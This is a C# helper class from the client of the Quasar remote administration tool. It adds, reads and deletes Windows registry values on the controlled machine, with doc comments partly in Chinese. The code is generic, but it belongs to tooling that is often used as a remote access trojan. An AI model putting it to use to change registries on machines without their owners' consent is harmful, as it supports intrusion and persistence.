using System;
using System.Collections.Generic;
using System.Linq;
using Microsoft.Win32;
using Quasar.Client.Extensions;
using Quasar.Common.Models;
using Quasar.Common.Utilities;

namespace Quasar.Client.Helper
{
    public static class RegistryKeyHelper
    {
        private static string DEFAULT_VALUE = String.Empty;

        /// <summary>
        /// 给注册表键添加一个值。
        /// </summary>
        /// <param name="hive">Represents the possible values for a top-level node on a foreign machine.</param>
        /// <param name="path">注册表键的路径。</param>
        /// <param name="name">值的名称。</param>
        /// <param name="value">The value.</param>
        /// <param name="addQuotes">如果设置为 "True"，则添加对值的引用</param>
        /// <returns>True on success, else False.</returns>
        public static bool AddRegistryKeyValue(RegistryHive hive, string path, string name, string value, bool addQuotes = false)
        {
            try
            {
                using (RegistryKey key = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path))
                {
                    if (key == null) return false;

                    if (addQuotes && !value.StartsWith("\"") && !value.EndsWith("\""))
                        value = "\"" + value + "\"";

                    key.SetValue(name, value);
                    return true;
                }
            }
            catch (Exception)
            {
                return false;
            }
        }

        /// <summary>
        /// 打开一个只读的注册表键。
        /// </summary>
        /// <param name="hive">Represents the possible values for a top-level node on a foreign machine.</param>
        /// <param name="path">注册表键的路径。</param>
        /// <returns></returns>
        public static RegistryKey OpenReadonlySubKey(RegistryHive hive, string path)
        {
            try
            {
                return RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenSubKey(path, false);
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// 从注册表键中删除指定的值。
        /// </summary>
        /// <param name="hive">Represents the possible values for a top-level node on a foreign machine.</param>
        /// <param name="path">注册表键的路径。</param>
        /// <param name="name">要删除的值的名称。</param>
        /// <returns>True on success, else False.</returns>
        public static bool DeleteRegistryKeyValue(RegistryHive hive, string path, string name)
        {
            try
            {
                using (RegistryKey key = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path))
                {
                    if (key == null) return false;
                    key.DeleteValue(name, true);
                    return true;
                }
            }
            catch (Exception)
            {
                return false;
            }
        }

        /// <summary>
        /// 检查提供的值是否是默认值
        /// </summary>
        /// <param name="valueName">值的名称</param>
        /// <returns>如果是默认值，则为真，否则为假</returns>
        public static bool IsDefaultValue(string valueName)
        {
            return String.IsNullOrEmpty(valueName);
        }

        /// <summary>
        /// 将默认值添加到值列表中，并以数组形式返回。
        /// 如果默认值已经存在，这个函数将只返回数组形式的列表。
        /// </summary>
        /// <param name="values">带有默认值的列表，默认值应该被添加到该列表中。/param>
        /// <returns>包含所有值的数组，包括默认值。</returns>
        public static RegValueData[] AddDefaultValue(List<RegValueData> values)
        {
            if(!values.Any(value => IsDefaultValue(value.Name)))
            {
                values.Add(GetDefaultValue());
            }
            return values.ToArray();
        }

        /// <summary>
        /// 获取默认的注册表值。
        /// </summary>
        /// <returns>一个包含默认注册表值的数组。</returns>
        public static RegValueData[] GetDefaultValues()
        {
            return new[] {GetDefaultValue()};
        }

        public static RegValueData CreateRegValueData(string name, RegistryValueKind kind, object value = null)
        {
            var newRegValue = new RegValueData {Name = name, Kind = kind};

            if (value == null)
                newRegValue.Data = new byte[] { };
            else
            {
                switch (newRegValue.Kind)
                {
                    case RegistryValueKind.Binary:
                        newRegValue.Data = (byte[]) value;
                        break;
                    case RegistryValueKind.MultiString:
                        newRegValue.Data = ByteConverter.GetBytes((string[]) value);
                        break;
                    case RegistryValueKind.DWord:
                        newRegValue.Data = ByteConverter.GetBytes((uint) (int) value);
                        break;
                    case RegistryValueKind.QWord:
                        newRegValue.Data = ByteConverter.GetBytes((ulong) (long) value);
                        break;
                    case RegistryValueKind.String:
                    case RegistryValueKind.ExpandString:
                        newRegValue.Data = ByteConverter.GetBytes((string) value);
                        break;
                }
            }

            return newRegValue;
        }

        private static RegValueData GetDefaultValue()
        {
            return CreateRegValueData(DEFAULT_VALUE, RegistryValueKind.String);
        }
    }
}
